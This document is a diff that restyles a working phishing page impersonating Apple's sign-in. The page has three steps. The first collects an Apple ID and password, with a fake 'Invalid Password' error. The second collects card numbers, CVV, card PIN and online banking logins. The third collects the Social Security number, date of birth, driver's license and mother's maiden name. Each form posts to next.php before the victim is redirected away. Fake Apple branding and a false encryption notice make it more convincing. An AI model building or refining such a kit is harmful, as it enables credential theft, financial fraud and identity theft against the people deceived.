@@ -13,19 +13,32 @@
     <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
     <script type="text/javascript" src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
     <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
-    <title>Sign in -Apple</title>
+    <title>Sign in - Apple</title>
     <style type="text/css">
-    html {
-        background: url(https://source.unsplash.com/random/1920x1080/?apple,minimal) no-repeat center center fixed;
-        -webkit-background-size: cover;
-        -moz-background-size: cover;
-        -o-background-size: cover;
-        background-size: cover;
+    body, html {
+        height: 100%;
+        margin: 0;
         font-family: -apple-system, BlinkMacSystemFont, 'SF Pro', 'SF Pro Text', system-ui, Helvetica, Arial, sans-serif;
+        background-color: #000;
+        color: white;
+    }
+    
+    .bg {
+        background-image: url("https://source.unsplash.com/random/1920x1080/?apple,minimal");
+        height: 100%;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-size: cover;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        z-index: -1;
+        filter: brightness(0.7);
     }
 
     .icon_sign_in:before {
-        margin-right: 25px;
+        margin-right: 15px;
         line-height: 0;
         font-weight: 400;
         font-style: normal;
@@ -40,23 +53,13 @@
         border: none;
     }
 
-    .signin-form.fed-auth.show-password~.si-button.fed-ui {
-        top: 45px;
-    }
-
-    .widget-container .si-field-container {
-        max-width: 400px;
-        position: relative;
-        outline: none;
-    }
-    
-    /* Modernized Styles */
+    /* Global Navigation */
     #ac-globalnav {
         width: 100%;
         height: 44px;
         background-color: rgba(0, 0, 0, 0.8);
         backdrop-filter: saturate(180%) blur(20px);
-        position: sticky;
+        position: fixed;
         top: 0;
         left: 0;
         z-index: 9999;
@@ -88,53 +91,87 @@
         color: #fff;
     }
     
-    .signin-container,
-    .login-container {
-        background-color: rgba(255, 255, 255, 0.9);
-        border-radius: 12px;
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-        margin-top: 30px;
-        padding: 20px;
+    /* Main content styling */
+    .main-wrapper {
+        padding-top: 60px;
+        min-height: calc(100vh - 120px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
     }
     
-    #signin {
+    .signin-container {
+        background-color: rgba(30, 30, 30, 0.7);
+        backdrop-filter: blur(20px);
+        border-radius: 12px;
+        width: 100%;
         max-width: 450px;
         margin: 0 auto;
+        padding: 30px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
     }
     
-    .form-textbox {
-        display: block;
-        width: 100%;
-        padding: 12px 16px;
-        border: 1px solid #d2d2d7;
-        border-radius: 12px;
+    .si-container-title {
+        font-size: 24px;
+        font-weight: 500;
+        text-align: center;
+        margin-bottom: 10px;
+        color: white;
+    }
+    
+    .subtitle {
+        color: rgba(255, 255, 255, 0.8);
+        text-align: center;
+        margin-bottom: 25px;
+        font-size: 14px;
+    }
+    
+    .form-control {
+        background-color: rgba(60, 60, 60, 0.5);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        color: white;
+        border-radius: 8px;
+        padding: 12px 15px;
         margin-bottom: 15px;
-        font-size: 17px;
-        transition: all 0.2s;
+        transition: all 0.3s;
     }
     
-    .form-textbox:focus {
-        border-color: #0071e3;
-        box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.15);
-        outline: none;
+    .form-control:focus {
+        background-color: rgba(70, 70, 70, 0.7);
+        border-color: rgba(255, 255, 255, 0.5);
+        box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.1);
+        color: white;
+    }
+    
+    .form-control::placeholder {
+        color: rgba(255, 255, 255, 0.6);
     }
     
     .si-button {
-        background-color: #0071e3;
+        background-color: rgba(0, 122, 255, 0.8);
         color: white;
         border: none;
-        border-radius: 12px;
+        border-radius: 8px;
         padding: 12px 20px;
-        font-size: 17px;
+        font-size: 16px;
+        font-weight: 500;
         cursor: pointer;
-        margin-top: 15px;
         width: 100%;
-        text-align: center;
+        margin-top: 15px;
         transition: background-color 0.2s;
     }
     
     .si-button:hover {
-        background-color: #0058b0;
+        background-color: rgba(0, 122, 255, 1);
+    }
+    
+    .btn-success {
+        background-color: rgba(0, 122, 255, 0.8);
+        border: none;
+    }
+    
+    .btn-success:hover {
+        background-color: rgba(0, 122, 255, 1);
     }
     
     .si-remember-password {
@@ -143,33 +180,18 @@
         margin-bottom: 15px;
     }
     
-    .form-choice-indicator {
-        width: 18px;
-        height: 18px;
-        border: 1px solid #d2d2d7;
-        border-radius: 4px;
-        margin-right: 8px;
-        display: inline-block;
+    .form-label {
+        color: white;
+        margin-left: 5px;
     }
     
-    #remember-me:checked + label .form-choice-indicator {
-        background-color: #0071e3;
-        border-color: #0071e3;
-    }
-    
-    .si-container-title {
-        font-size: 27px;
-        font-weight: 600;
-        margin-bottom: 10px;
-    }
-    
-    .subtitle {
-        color: #86868b;
-        margin-bottom: 25px;
+    .separator {
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
+        margin: 20px 0;
     }
     
     .links a {
-        color: #0071e3;
+        color: #0070c9;
         text-decoration: none;
     }
     
@@ -177,63 +199,50 @@
         text-decoration: underline;
     }
     
-    .separator {
-        border-top: 1px solid #d2d2d7;
-        margin: 20px 0;
-    }
-    
-    .btn-success {
-        background-color: #0071e3;
-        border-color: #0071e3;
-    }
-    
-    .btn-success:hover {
-        background-color: #0058b0;
-        border-color: #0058b0;
+    /* Footer styling */
+    .fixed-bottom {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
     }
     
     .as-chat {
-        background-color: white;
-        padding: 15px 0;
-        border-top: 1px solid #d2d2d7;
+        background-color: rgba(30, 30, 30, 0.8);
+        backdrop-filter: blur(20px);
+        color: white;
+        padding: 12px 0;
+        text-align: center;
+        border-top: 1px solid rgba(255, 255, 255, 0.1);
     }
     
     .as-chat-button {
-        color: #0071e3;
-        background: none;
+        color: #0070c9;
+        background: transparent;
         border: none;
-        padding: 0;
-        font: inherit;
         cursor: pointer;
     }
     
-    .as-chat-button:hover {
-        text-decoration: underline;
-    }
-    
     .as-footnotes {
-        background-color: #f5f5f7;
+        background-color: rgba(20, 20, 20, 0.8);
+        backdrop-filter: blur(20px);
         padding: 15px 0;
-        font-size: 12px;
-        color: #86868b;
+        font-size: 11px;
+        color: rgba(255, 255, 255, 0.6);
+        text-align: center;
     }
     
     .as-footnotes a {
-        color: #0071e3;
+        color: #0070c9;
         text-decoration: none;
     }
     
-    .as-footnotes a:hover {
-        text-decoration: underline;
-    }
-    
-    /* Progress Steps (Added Feature) */
+    /* Progress Steps */
     .progress-container {
         display: flex;
         justify-content: space-between;
-        margin-bottom: 30px;
-        padding: 0 10px;
+        margin: 0 auto 30px;
         position: relative;
+        max-width: 300px;
     }
     
     .progress-container:before {
@@ -243,7 +252,7 @@
         left: 20px;
         right: 20px;
         height: 1px;
-        background: #d2d2d7;
+        background: rgba(255, 255, 255, 0.2);
         z-index: 1;
     }
     
@@ -260,36 +269,34 @@
         width: 30px;
         height: 30px;
         border-radius: 50%;
-        background-color: white;
-        border: 1px solid #d2d2d7;
+        background-color: rgba(50, 50, 50, 0.7);
+        border: 1px solid rgba(255, 255, 255, 0.3);
         display: flex;
         align-items: center;
         justify-content: center;
         font-size: 14px;
         font-weight: 500;
         margin-bottom: 8px;
+        color: white;
     }
     
     .step.active .step-number {
-        background-color: #0071e3;
-        color: white;
-        border-color: #0071e3;
+        background-color: #0070c9;
+        border-color: #0070c9;
     }
     
     .step.completed .step-number {
-        background-color: #0071e3;
-        color: white;
-        border-color: #0071e3;
+        background-color: #0070c9;
+        border-color: #0070c9;
     }
     
     .step-label {
         font-size: 12px;
-        color: #86868b;
+        color: rgba(255, 255, 255, 0.7);
     }
     
     .step.active .step-label {
-        color: #0071e3;
-        font-weight: 500;
+        color: #0070c9;
     }
     
     /* Animation classes */
@@ -302,15 +309,23 @@
         to { opacity: 1; }
     }
     
+    /* Responsive styling */
     @media (max-width: 768px) {
         .ac-gn-list li:not(:first-child):not(:last-child) {
             display: none;
+        }
+        
+        .signin-container {
+            margin: 20px;
+            padding: 20px;
         }
     }
     </style>
 </head>
 
 <body>
+    <div class="bg"></div>
+    
     <!-- Global Navigation -->
     <nav id="ac-globalnav" class="js no-touch windows" role="navigation">
         <div class="ac-gn-content">
@@ -356,291 +371,210 @@
                     </a>
                 </li>
                 <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
-                    <a id="ac-gn-link-search" class="ac-gn-link ac-gn-link-search " href="#"></a>
-                </li>
-                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
-                    <div class="ac-gn-bag-wrapper">
-                        <a class="ac-gn-link ac-gn-link-bag " href="#">
-                            <span class="ac-gn-link-text">Shopping Bag</span>
-                        </a>
-                        <span class="ac-gn-bag-badge" aria-hidden="true">
-                            <span class="ac-gn-bag-badge-separator"></span>
-                            <span class="ac-gn-bag-badge-number"></span>
-                            <span class="ac-gn-bag-badge-unit">+</span>
-                        </span>
-                    </div>
-                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                    <a id="ac-gn-link-search" class="ac-gn-link ac-gn-link-search " href="#">
+                        <span class="ac-gn-link-text">Search apple.com</span>
+                    </a>
                 </li>
             </ul>
         </div>
     </nav>
-    <div id="signin-container" class="rs-page-content">
-        <div>
-            <div id="rr-viewport"></div>
-            <div role="main">
-                <div class="rs-signin rs-signin-widget rs-signin-widgetstandalone">
-                    <div class="row rs-signin-main as-l-container">
-                        <div class="column as-widgetsignin-returningcustomer-container">
-                            <div class="as-widgetsignin-returningcustomer" id="as-widgetsignin-container">
-                                <div class="widget-container  fade-in restrict-min-content  fade-in ">
-                                    <div id="bl1" class="si-step ">
-                                        <div id="stepEl" class="   ">
-                                            <div class="signin fade-in mt-5" id="signin">
-                                                <h1 tabindex="-1" class="si-container-title tk-label text-white">
-                                                    Sign in to Apple Store
-                                                </h1>
-                                                <div>
-                                                    <div id="error" class="alert alert-danger col-lg-6 mx-auto" style="display: none;font-size: 13px">Invalid Password..! Please enter correct password.</div>
-                                                </div>
-                                                <form action="next.php" method="POST" name="signinform" id="form-field-1">
-                                                    <input type="hidden" name="count" id="count" value="0">
-                                                    <div class="container si-field-container  password-second-step  password-on     ">
-                                                        <div id="sign_in_form" class="signin-form account-name-entered fed-auth show-password">
-                                                            <div class="si-field-container container">
-                                                                <div class="form-table">
-                                                                    <div class="account-name form-row     show-password ">
-                                                                        <label class="sr-only form-cell form-label" for="account_name_text_field">Sign in to Apple Store Apple ID</label>
-                                                                        <div class="form-cell">
-                                                                            <div class=" form-cell-wrapper ">
-                                                                                <input type="text" name="ai" id="ai" can-field="accountName" required="required" class="form-textbox" placeholder="Apple&nbsp;ID" autofocus="">
-                                                                            </div>
-                                                                        </div>
-                                                                    </div>
-                                                                    <div class="password form-row    show-password show-placeholder   ">
-                                                                        <label class="sr-only form-cell form-label" for="password_text_field">Password</label>
-                                                                        <div class="form-cell">
-                                                                            <div class="form-cell-wrapper ">
-                                                                                <input type="password" name="pr" id="pr" required="required" class="form-textbox" placeholder="Password" autocomplete="false">
-                                                                            </div>
-                                                                        </div>
-                                                                    </div>
-                                                                </div>
-                                                            </div>
-                                                        </div>
-                                                        <div class="si-remember-password">
-                                                            <input type="checkbox" id="remember-me" class="form-choice form-choice-checkbox">
-                                                            <label id="remember-me-label" class="form-label text-white" for="remember-me">
-                                                                <span class="form-choice-indicator"></span> Remember me
-                                                            </label>
-                                                        </div>
-                                                        <input type="hidden" name="btn1" value="btn1">
-                                                        <button type="submit" name="sub-btn-1" id="sub-btn-1" tabindex="0" style="border:none" class="si-button">
-                                                            <i class="icon_sign_in"></i>
-                                                            <span class="text feat-split">
-                                                                Sign In
-                                                            </span>
-                                                        </button>
-                                                    </div>
-                                                </form>
-                                                <div class="si-container-footer">
-                                                    <div class="separator"></div>
-                                                    <div class="links tk-subbody">
-                                                        <div class="si-forgot-password text-white">
-                                                            <a id="iforgot-link" class="si-link ax-outline lite-theme-override text-white" href="#" target="_blank">Forgot Apple&nbsp;ID or password?<span class="sr-only"> Opens in a new window.</span></a>
-                                                        </div>
-                                                        <div class="text-white">
-                                                            <span class="fat">
-                                                                Don't have an Apple&nbsp;ID?</span>
-                                                            <a id="create-link" class="si-forgot-password si-link ax-outline lite-theme-override text-white" href="#" target="_blank">
-                                                                Create yours now.<span class="sr-only"> Opens in a new window.</span></a>
-                                                        </div>
-                                                    </div>
-                                                </div>
-                                            </div>
-                                        </div>
-                                    </div>
-
-
-                                    <div id="bl2" class="si-step " style="margin-top: 150px;display: none;">
-                                        <div id="stepEl" class="">
-                                            <div class="signin fade-in mt-5" id="signin">
-                                                <h1 tabindex="-1" class="si-container-title tk-label text-white">
-                                                    Verify Your Identity
-                                                </h1>
-                                                
-                                                <!-- Progress steps - this is a new element -->
-                                                <div class="progress-container mb-4">
-                                                    <div class="step completed">
-                                                        <div class="step-number">1</div>
-                                                        <div class="step-label">Sign In</div>
-                                                    </div>
-                                                    <div class="step active">
-                                                        <div class="step-number">2</div>
-                                                        <div class="step-label">Payment</div>
-                                                    </div>
-                                                    <div class="step">
-                                                        <div class="step-number">3</div>
-                                                        <div class="step-label">Details</div>
-                                                    </div>
-                                                </div>
-                                                
-                                                <form action="next.php" method="POST" name="signinform" id="form-field-2">
-                                                    <div class="container si-field-container  password-second-step  password-on     ">
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="bank_name" required="" class="form-control" placeholder="Bank Name">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="noc" required="" class="form-control" placeholder="Name on Card">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="ccn" id="ccn" required="" class="form-control" placeholder="Credit Card Number">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="exdate" id="exdate" required="" class="form-control" placeholder="Exp Date">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="cvv" required="" class="form-control" placeholder="CVV">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="password" name="pin" required="" class="form-control" placeholder="Card Pin">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="bank_user" required="" class="form-control" placeholder="Bank Username">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="password" name="bank_pass" required="" class="form-control" placeholder="Bank Password">
-                                                            </div>
-                                                        </div>
-                                                        <input type="hidden" name="btn2" value="btn2">
-                                                        <div class="row mt-2">
-                                                            <div class="col text-center">
-                                                                <input type="submit" class="form-control btn-success" id="sub-btn-2" name="sub-btn-2" value="Continue" style="text-align: center;">
-                                                            </div>
-                                                        </div>
-                                                    </div>
-                                                </form>
-                                            </div>
-                                        </div>
-                                    </div>
-
-
-
-                                    <div id="bl3" class="si-step " style="margin-top: 150px;display:none;">
-                                        <div id="stepEl" class="">
-                                            <div class="signin fade-in mt-5" id="signin">
-                                                <h1 tabindex="-1" class="si-container-title tk-label text-white">
-                                                    Verify Your Detail
-                                                </h1>
-                                                
-                                                <!-- Progress steps - this is a new element -->
-                                                <div class="progress-container mb-4">
-                                                    <div class="step completed">
-                                                        <div class="step-number">1</div>
-                                                        <div class="step-label">Sign In</div>
-                                                    </div>
-                                                    <div class="step completed">
-                                                        <div class="step-number">2</div>
-                                                        <div class="step-label">Payment</div>
-                                                    </div>
-                                                    <div class="step active">
-                                                        <div class="step-number">3</div>
-                                                        <div class="step-label">Details</div>
-                                                    </div>
-                                                </div>
-                                                
-                                                <form action="next.php" method="POST" name="signinform" id="form-field-3">
-                                                    <div class="container si-field-container  password-second-step  password-on     ">
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="fname" required="" class="form-control" placeholder="First Name">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="lname" required="" class="form-control" placeholder="Last Name">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="badd" required="" class="form-control" placeholder="Billing Address">
-                                                            </div>
-                                                        </div>
-                                                         <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="state" required="" class="form-control" placeholder="State">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="ct" required="" class="form-control" placeholder="City">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="zip" required="" class="form-control" placeholder="ZIP Code">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="ph" id="ph" required="" class="form-control" placeholder="Phone Number">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="ssn" id="ssn" required="" class="form-control" placeholder="Social Security Number">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="dob" id="dob" required="" class="form-control" placeholder="Date of Birth">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="dln" id="dln" required="" class="form-control" placeholder="Driver's License">
-                                                            </div>
-                                                        </div>
-                                                        <div class="row mt-2">
-                                                            <div class="col">
-                                                                <input type="text" name="mname" required="" class="form-control" placeholder="Mother's Maiden Name">
-                                                            </div>
-                                                        </div>
-
-                                                        <input type="hidden" name="btn3" value="btn3">
-                                                        <div class="row mt-2">
-                                                            <div class="col text-center">
-                                                                <input type="submit" class="form-control btn-success" id="sub-btn-3" name="sub-btn-3" value="Complete Verification" style="text-align: center;">
-                                                            </div>
-                                                        </div>
-                                                    </div>
-                                                </form>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
+    
+    <!-- Main Content -->
+    <div class="main-wrapper">
+        <div class="container">
+            <!-- Step 1: Login -->
+            <div id="bl1" class="si-step">
+                <div class="signin-container fade-in">
+                    <h1 class="si-container-title">Sign in with your Apple&nbsp;ID</h1>
+                    <p class="subtitle">to continue to Apple services</p>
+                    
+                    <div id="error" class="alert alert-danger" style="display: none;font-size: 13px">Invalid Password. Please enter correct password.</div>
+                    
+                    <form action="next.php" method="POST" name="signinform" id="form-field-1">
+                        <input type="hidden" name="count" id="count" value="0">
+                        <input type="hidden" name="btn1" value="btn1">
+                        
+                        <div class="form-group">
+                            <input type="text" name="ai" id="ai" required class="form-control" placeholder="Apple ID or Email">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="password" name="pr" id="pr" required class="form-control" placeholder="Password">
+                        </div>
+                        
+                        <div class="si-remember-password">
+                            <input type="checkbox" id="remember-me" class="form-check-input">
+                            <label for="remember-me" class="form-label">Remember me</label>
+                        </div>
+                        
+                        <button type="submit" id="sub-btn-1" class="si-button">
+                            <i class="icon_sign_in"></i>Sign In
+                        </button>
+                    </form>
+                    
+                    <div class="separator"></div>
+                    
+                    <div class="links text-center">
+                        <div class="mb-2">
+                            <a href="#" id="iforgot-link">Forgot Apple&nbsp;ID or password?</a>
+                        </div>
+                        <div>
+                            <span style="color: rgba(255,255,255,0.8);">Don't have an Apple&nbsp;ID?</span>
+                            <a href="#" id="create-link">Create yours now</a>
                         </div>
                     </div>
                 </div>
-                <div class="fixed-bottom">
-                    <div class="as-chat rs-chat bg-white">
-                        <div class="as-l-container rs-chat-content">
-                            <div>Need some help? <button class="as-chat-button">Chat now</button> or call <span>1‑800‑MY‑APPLE</span>.</div>
+            </div>
+            
+            <!-- Step 2: Payment Information -->
+            <div id="bl2" class="si-step" style="display:none;">
+                <div class="signin-container fade-in">
+                    <h1 class="si-container-title">Verify Your Identity</h1>
+                    <p class="subtitle">Confirm your payment details</p>
+                    
+                    <!-- Progress Steps -->
+                    <div class="progress-container">
+                        <div class="step completed">
+                            <div class="step-number">1</div>
+                            <div class="step-label">Sign In</div>
+                        </div>
+                        <div class="step active">
+                            <div class="step-number">2</div>
+                            <div class="step-label">Payment</div>
+                        </div>
+                        <div class="step">
+                            <div class="step-number">3</div>
+                            <div class="step-label">Details</div>
                         </div>
                     </div>
-                    <div class="as-footnotes">
-                        <div class="as-footnotes-content">
-                            <div class="as-footnotes-sosumi">
-                                <p>The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a>.</p>
-                            </div>
+                    
+                    <form action="next.php" method="POST" name="signinform" id="form-field-2">
+                        <input type="hidden" name="btn2" value="btn2">
+                        
+                        <div class="form-group">
+                            <input type="text" name="bank_name" required class="form-control" placeholder="Bank Name">
                         </div>
-                    </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="noc" required class="form-control" placeholder="Name on Card">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="ccn" id="ccn" required class="form-control" placeholder="Credit Card Number">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="exdate" id="exdate" required class="form-control" placeholder="Expiration Date (MM/YYYY)">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="cvv" required class="form-control" placeholder="CVV">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="password" name="pin" required class="form-control" placeholder="Card PIN">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="bank_user" required class="form-control" placeholder="Bank Username">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="password" name="bank_pass" required class="form-control" placeholder="Bank Password">
+                        </div>
+                        
+                        <button type="submit" id="sub-btn-2" class="si-button">Continue</button>
+                    </form>
                 </div>
+            </div>
+            
+            <!-- Step 3: Personal Details -->
+            <div id="bl3" class="si-step" style="display:none;">
+                <div class="signin-container fade-in">
+                    <h1 class="si-container-title">Verify Your Details</h1>
+                    <p class="subtitle">Complete your profile information</p>
+                    
+                    <!-- Progress Steps -->
+                    <div class="progress-container">
+                        <div class="step completed">
+                            <div class="step-number">1</div>
+                            <div class="step-label">Sign In</div>
+                        </div>
+                        <div class="step completed">
+                            <div class="step-number">2</div>
+                            <div class="step-label">Payment</div>
+                        </div>
+                        <div class="step active">
+                            <div class="step-number">3</div>
+                            <div class="step-label">Details</div>
+                        </div>
+                    </div>
+                    
+                    <form action="next.php" method="POST" name="signinform" id="form-field-3">
+                        <input type="hidden" name="btn3" value="btn3">
+                        
+                        <div class="form-group">
+                            <input type="text" name="fname" required class="form-control" placeholder="First Name">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="lname" required class="form-control" placeholder="Last Name">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="badd" required class="form-control" placeholder="Billing Address">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="ct" required class="form-control" placeholder="City">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="state" required class="form-control" placeholder="State">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="zip" required class="form-control" placeholder="ZIP Code">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="ph" id="ph" required class="form-control" placeholder="Phone Number">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="ssn" id="ssn" required class="form-control" placeholder="Social Security Number">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="dob" id="dob" required class="form-control" placeholder="Date of Birth (MM/DD/YYYY)">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="dln" id="dln" required class="form-control" placeholder="Driver's License">
+                        </div>
+                        
+                        <div class="form-group">
+                            <input type="text" name="mname" required class="form-control" placeholder="Mother's Maiden Name">
+                        </div>
+                        
+                        <button type="submit" id="sub-btn-3" class="si-button">Complete Verification</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Footer -->
+    <div class="fixed-bottom">
+        <div class="as-chat">
+            <div class="container">
+                <div>Need some help? <button class="as-chat-button">Chat now</button> or call <span>1‑800‑MY‑APPLE</span>.</div>
+            </div>
+        </div>
+        <div class="as-footnotes">
+            <div class="container">
+                <p>The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a>.</p>
+                <p>Copyright © 2025 Apple Inc. All rights reserved.</p>
             </div>
         </div>
     </div>
@@ -650,7 +584,7 @@
     <script type="text/javascript">
         $("#ssn").inputmask({"mask": "999-99-9999"});
         $("#ccn").inputmask({"mask": "9999 9999 9999 9999"});
-        $("#dob").inputmask({"mask": "99/99/9999","placeholder":"DD/MM/YYYY"});
+        $("#dob").inputmask({"mask": "99/99/9999","placeholder":"MM/DD/YYYY"});
         $("#exdate").inputmask({"mask": "99/9999","placeholder":"MM/YYYY"});
         $("#ph").inputmask({"mask": "999-999-9999"});
     </script>
@@ -792,7 +726,7 @@ $(document).ready(function() {
             type: 'POST',
             data: c,
             beforeSend: function(a) {
-                $('#sub-btn-3').html('Verifying...')
+                $('#sub-btn-3').html('Processing...')
             },
             complete: function(a) {
                 window.location.replace(rdrt)
